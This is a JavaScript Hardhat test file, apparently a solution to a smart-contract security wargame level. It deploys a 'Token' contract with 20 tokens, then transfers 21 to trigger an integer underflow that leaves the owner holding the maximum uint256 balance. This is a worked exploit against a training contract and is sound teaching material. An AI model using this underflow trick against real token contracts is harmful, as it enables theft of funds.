require("@nomiclabs/hardhat-waffle");
const { expect } = require("chai");

describe("E05_Token", async function () {
  var owner, user, factory, challenge;
  before(async function() {
    [owner, user] = await ethers.getSigners();
    factory = await ethers.getContractFactory("Token");
    challenge = await factory.deploy(20);
    await challenge.deployed();
  });
  it("Setup of token contract gives owner 20 tokens", async () => {
    expect(await challenge.balanceOf(owner.address)).to.equal(20);
  });
  it("Successfull hack of contract gives owner uint max value (2**256-1) tokens", async () => {
    await challenge.transfer(user.address, 21);
    expect(await challenge.balanceOf(owner.address)).to.be.equal(ethers.constants.MaxUint256);
  });
});